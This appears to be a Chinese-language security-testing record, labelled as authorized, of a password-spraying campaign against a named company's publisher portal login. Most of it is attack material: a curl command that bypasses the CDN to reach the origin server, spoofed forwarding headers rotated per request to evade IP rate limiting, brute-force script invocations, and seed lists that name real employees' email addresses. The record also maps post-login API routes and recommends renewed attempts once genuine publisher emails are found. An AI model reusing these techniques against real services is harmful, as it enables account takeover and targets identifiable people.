# Publisher Portal 登录凭据面复核阴性：ws15 源站 19,480 组 + staging 800 组全 401/39B（无 captcha/无锁定/无 IP 限流，但无命中）

- **code**: publisher-portal-cred-review-negative
- **kind**: script
- **category**: weak-password
- **component**: Publisher Portal (React/Vite + Heroku Express)
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测于 fanatical.com（授权靶场）：ws15 源站直连（--resolve ws15.fanatical.com:443:3.33.161.45 + Host: ws15.fanatical.com + X-Forwarded-Host: www.fanatical.com + 每请求唯一 X-Forwarded-For）POST /api/publisher-portal/auth/login，40 个种子邮箱（30 个 @fanatical.com 含 ian.egner/bartosz.bednarowicz + 10 个公开出版社联系猜测）× 883 个唯一口令（204 公司派生 + rockyou 前 700），轮转喷洒 19,480 组全部 HTTP 401/39B「Invalid email or password」，零 200/token/Set-Cookie、零 429、零锁定、零验证码；apistaging 同口径 800/800 401/39B；战役后同一账号累计 886 次仍 401。唯一非 401 为邮箱格式非法→400 validation。结论：该登录面无防护缺陷可用于无限尝试，但 20k 广度采样无弱口令命中，除非获得真实 publisher 邮箱种子否则不建议重派。
- **path**: pocs/publisher-portal-cred-review-negative/poc.py
- **created_at**: 2026-11-11T22:17:46.277Z
- **engine**: https://ws15.fanatical.com/api/publisher-portal/auth/login

## 用法

```
# 任意新种子深测（先确认基线 401/39B，再跑批量；命中=200+token）
python3 /opt/artex/data/tasks/5/i3122/brute_portal.py --target ws15 --cap 20000 --workers 10 --sleep 0.12 --deep 1000 --tag retry
# 只改 brute_portal.py 的 EMAILS/DERIVED 或增 --cap；staging 对照加 --target staging
```

## 正文

```
复现（最小）：
1) 基线（应 401/39B）：
curl -sS -m 20 --noproxy '*' -k --resolve ws15.fanatical.com:443:3.33.161.45 \
  -H "Host: ws15.fanatical.com" -H "X-Forwarded-Host: www.fanatical.com" \
  -H "X-Forwarded-For: 198.51.100.77" -H "Content-Type: application/json" \
  -X POST https://ws15.fanatical.com/api/publisher-portal/auth/login \
  -d '{"email":"publisherportal@fanatical.com","password":"WrongPass123!"}'
# → HTTP/2 401, content-length: 39, {"message":"Invalid email or password"}

2) 批量喷洒：/opt/artex/data/tasks/5/i3122/brute_portal.py
python3 brute_portal.py --target ws15 --cap 20000 --workers 10 --sleep 0.12 --deep 500 --tag main
# 通道=脚本内 socket.getaddrinfo 补丁把 ws15.fanatical.com 解析到 3.33.161.45（等价 curl --resolve），
# 每请求唯一 X-Forwarded-For；失败恒 401/39B，命中判据=HTTP 200 且 body 含 token。
# 结果：19,480/19,480 401，0 anomaly，0 hit，43.4 req/s，448s。

3) staging 对照：--target staging --cap 800 → 800/800 401/39B（apistaging.fanatical.com + XFH staging.fanatical.com）。

备注：登录响应成功形态由 portal bundle 确认：mutationFn POST /auth/login → {token:t.token, user:lf.parse(t.user)}；
后续接口 /me、/account/users、/reporting/embed-url?dashboard=&supplierId=，Authorization 头传 token 原值（无 Bearer）。
无 captcha、无账号锁定、无 IP 级 429（唯一 XFF 换桶），因此本面可作为「拿到真实 publisher 邮箱后」的一次性深测入口。
```
